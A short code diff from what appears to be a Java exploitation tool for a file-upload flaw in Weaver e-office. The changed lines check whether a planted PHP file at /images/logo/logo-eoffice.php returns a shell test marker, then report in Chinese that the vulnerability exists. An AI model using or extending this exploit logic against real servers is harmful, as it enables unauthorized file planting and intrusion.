@@ -38,7 +38,7 @@ public class weaveroa_office_UploadFile implements Exploitlnterface {
             Response response = HttpTools.get(url + "/images/logo/logo-eoffice.php", new HashMap<String, String>(), "utf-8");
             System.out.println("到这了");
             System.out.println(response.getText());
-            if(response.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
+            if(response.getText().contains(shell.test_payload)){
                 textArea.appendText("\n 漏洞存在 测试文件写入成功 \n 地址为："+ url + "/images/logo/logo-eoffice.php");
                 return true;
             }else {
